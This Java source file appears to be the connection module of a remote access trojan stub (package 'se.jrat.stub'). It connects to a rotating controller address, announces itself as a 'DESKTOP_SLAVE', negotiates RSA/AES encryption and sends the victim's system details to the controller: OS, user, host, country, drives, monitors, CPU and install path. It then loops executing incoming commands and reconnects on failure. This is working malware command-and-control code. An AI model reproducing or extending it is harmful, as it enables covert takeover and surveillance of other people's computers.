package se.jrat.stub;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.security.PublicKey;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import se.jrat.common.ConnectionCodes;
import se.jrat.common.crypto.Crypto;
import se.jrat.common.crypto.CryptoUtils;
import se.jrat.common.crypto.KeyExchanger;
import se.jrat.common.io.StringWriter;
import se.jrat.stub.packets.incoming.AbstractIncomingPacket;
import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
import se.jrat.stub.packets.outgoing.Packet10InitInstallPath;
import se.jrat.stub.packets.outgoing.Packet11InitInstallationDate;
import se.jrat.stub.packets.outgoing.Packet12InitLocalAddress;
import se.jrat.stub.packets.outgoing.Packet13InitTotalMemory;
import se.jrat.stub.packets.outgoing.Packet14InitAvailableCores;
import se.jrat.stub.packets.outgoing.Packet15InitJavaPath;
import se.jrat.stub.packets.outgoing.Packet16LoadedPlugins;
import se.jrat.stub.packets.outgoing.Packet17InitDrives;
import se.jrat.stub.packets.outgoing.Packet18InitMonitors;
import se.jrat.stub.packets.outgoing.Packet19InitCPU;
import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
import se.jrat.stub.packets.outgoing.Packet2Status;
import se.jrat.stub.packets.outgoing.Packet3Initialized;
import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
import se.jrat.stub.packets.outgoing.Packet5InitUserHost;
import se.jrat.stub.packets.outgoing.Packet6InitVersion;
import se.jrat.stub.packets.outgoing.Packet7InitServerID;
import se.jrat.stub.packets.outgoing.Packet8InitCountry;
import se.jrat.stub.packets.outgoing.Packet9InitJavaVersion;

public class Connection implements Runnable {

	public static boolean lock;

	public static Socket socket;
	public static boolean busy = false;
	public static FrameChat frameChat;

	public static InputStream inputStream;
	public static OutputStream outputStream;

	public static DataInputStream dis;
	public static DataOutputStream dos;

	public static PublicKey pubKey;
	
	public static final StringWriter sw = new StringWriter() {
		@Override
		public void writeLine(String s) throws Exception {
			Connection.writeLine(s);
		}
	};

	public void run() {
		try {
			Address address = DnsRotator.getNextAddress();

			socket = new Socket(address.getAddress(), address.getPort());

			socket.setSoTimeout(Configuration.timeout);

			Connection.inputStream = socket.getInputStream();
			Connection.outputStream = socket.getOutputStream();

			Connection.dis = new DataInputStream(inputStream);
			Connection.dos = new DataOutputStream(outputStream);
	        
			outputStream.write(ConnectionCodes.DESKTOP_SLAVE);
			
			KeyExchanger exchanger = new KeyExchanger(dis, dos, Main.getKeyPair());
			exchanger.readRemotePublicKey();
			pubKey = exchanger.getRemoteKey();
			exchanger.writePublicKey();
			
			int keylen = dis.readInt();
			int ivlen = dis.readInt();
			byte[] encKey = new byte[keylen];
			byte[] biv = new byte[ivlen];
			dis.readFully(encKey);
			dis.readFully(biv);
			Main.aesKey = Crypto.decrypt(encKey, Main.getKeyPair().getPrivate(), "RSA");
			biv = Crypto.decrypt(biv, Main.getKeyPair().getPrivate(), "RSA");
					
			SecretKeySpec secretKey = new SecretKeySpec(Main.aesKey, "AES");
			IvParameterSpec iv = new IvParameterSpec(biv);
						
			Cipher inCipher = CryptoUtils.getStreamCipher(Cipher.DECRYPT_MODE, secretKey, iv);
			Cipher outCipher = CryptoUtils.getStreamCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
			
			Connection.inputStream = new CipherInputStream(socket.getInputStream(), inCipher);
			Connection.outputStream = new CipherOutputStream(socket.getOutputStream(), outCipher);

			Connection.dis = new DataInputStream(inputStream);
			Connection.dos = new DataOutputStream(outputStream);

			initialize();

			status(Constants.STATUS_READY);

			for (Plugin plugin : Plugin.list) {
				plugin.methods.get("onconnect").invoke(plugin.instance, new Object[] { dis, dos });
			}

			while (true) {
				byte line = readByte();

				if (line == 0) {
					Connection.writeByte(0);
					continue;
				}
				
				AbstractIncomingPacket.execute(line);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			try {
				Thread.sleep(Configuration.reconnectSeconds * 1000L);
				new Thread(this).start();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void initialize() throws Exception {
		addToSendQueue(new Packet1InitHandshake());	
		refreshInit();		
		addToSendQueue(new Packet3Initialized());
	}
	
	public static void refreshInit() {
		addToSendQueue(new Packet4InitOperatingSystem());
		addToSendQueue(new Packet5InitUserHost());	
		addToSendQueue(new Packet6InitVersion());
		addToSendQueue(new Packet7InitServerID());
		addToSendQueue(new Packet8InitCountry());
		addToSendQueue(new Packet9InitJavaVersion());
		addToSendQueue(new Packet10InitInstallPath());
		addToSendQueue(new Packet11InitInstallationDate());
		addToSendQueue(new Packet12InitLocalAddress());
		addToSendQueue(new Packet13InitTotalMemory());
		addToSendQueue(new Packet14InitAvailableCores());
		addToSendQueue(new Packet15InitJavaPath());
		addToSendQueue(new Packet16LoadedPlugins());
		addToSendQueue(new Packet17InitDrives());
		addToSendQueue(new Packet18InitMonitors());
		addToSendQueue(new Packet19InitCPU());
	}

	public static void addToSendQueue(AbstractOutgoingPacket packet) {
		while (lock) {
			try {
				Thread.sleep(10L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
		packet.send(dos, sw);
	}

	public static void writeLine(String s) {
		if (s == null) {
			Main.debug("String is null!");
			s = "";
		}
		try {
			dos.writeShort(s.length());
			dos.writeChars(s);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static String readLine() {
		try {
			short len = dis.readShort();

			StringBuilder builder = new StringBuilder();
			for (int i = 0; i < len; i++) {
				builder.append(dis.readChar());
			}

			String s = builder.toString();

			return s;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	public static void writeShort(short i) throws Exception {
		dos.writeShort(i);
	}

	public static short readShort() throws Exception {
		return dis.readShort();
	}

	public static byte readByte() throws Exception {
		return dis.readByte();
	}

	public static void writeByte(int b) throws Exception {
		dos.writeByte(b);
	}

	public static boolean readBoolean() throws Exception {
		return dis.readBoolean();
	}

	public static void writeBoolean(boolean b) throws Exception {
		dos.writeBoolean(b);
	}

	public static int readInt() throws Exception {
		return dis.readInt();
	}

	public static void writeInt(int i) throws Exception {
		dos.writeInt(i);
	}

	public static long readLong() throws Exception {
		return dis.readLong();
	}

	public static void writeLong(long l) throws Exception {
		dos.writeLong(l);
	}

	public static void writeLine(Object obj) throws Exception {
		writeLine(obj.toString());
	}

	public static void status(String status) {
		addToSendQueue(new Packet2Status(status));
	}

	public static void status(int status) {
		addToSendQueue(new Packet2Status(status + ""));
	}

	public static void lock() {
		lock = !lock;
	}
}
